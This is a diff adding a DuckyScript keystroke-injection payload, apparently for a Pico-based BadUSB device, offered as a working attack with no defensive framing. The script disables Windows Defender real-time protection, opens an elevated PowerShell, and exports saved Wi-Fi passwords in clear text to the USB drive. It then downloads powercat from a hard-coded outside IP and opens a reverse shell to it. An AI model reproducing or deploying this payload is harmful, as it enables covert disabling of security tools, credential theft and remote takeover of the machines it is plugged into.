@@ -1,0 +1,67 @@
+REM Anti virus disabling portion
+REM Pause for usb to recognize and be ready
+DELAY 2000
+
+REM Open Windows Defender Settings
+CTRL ESC
+DELAY 750
+STRING virus and threat protection
+DELAY 250
+ENTER
+DELAY 1000
+ENTER
+
+REM Navigate to Manage Settings
+GUI
+DELAY 700
+GUI
+DELAY 1500
+TAB
+DELAY 600
+TAB
+DELAY 600
+TAB
+TAB
+DELAY 200
+ENTER
+DELAY 500
+
+REM Open and turn off Realtime Protection
+SPACE
+DELAY 1000
+ALT y
+DELAY 1000
+
+
+REM wifipassword stealing
+REM open powershell in Admin mode
+DELAY 1000
+GUI r
+DELAY 1000
+STRING powershell
+ENTER
+DELAY 500
+
+REM START PS AS ADMIN
+STRING powershell "start-process powershell -verb runas"
+ENTER
+DELAY 1000
+ALT y
+DELAY 300
+
+REM command for stealing wifi passwords and saving it in the d:/ folder which is the pico itself
+STRING netsh wlan export profile folder=d:\ key=clear
+ENTER
+DELAY 500
+
+DELAY 500
+GUI r
+DELAY 600
+STRING powershell
+ENTER
+DELAY 1000
+
+REM host your powercat script on the attacker side with simplehttps
+REM Write the client side command and change ip and port when requied
+STRING powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://139.144.16.86/powercat.ps1') ;powercat -c 139.144.16.86 -p 9001 -ep"
+ENTER
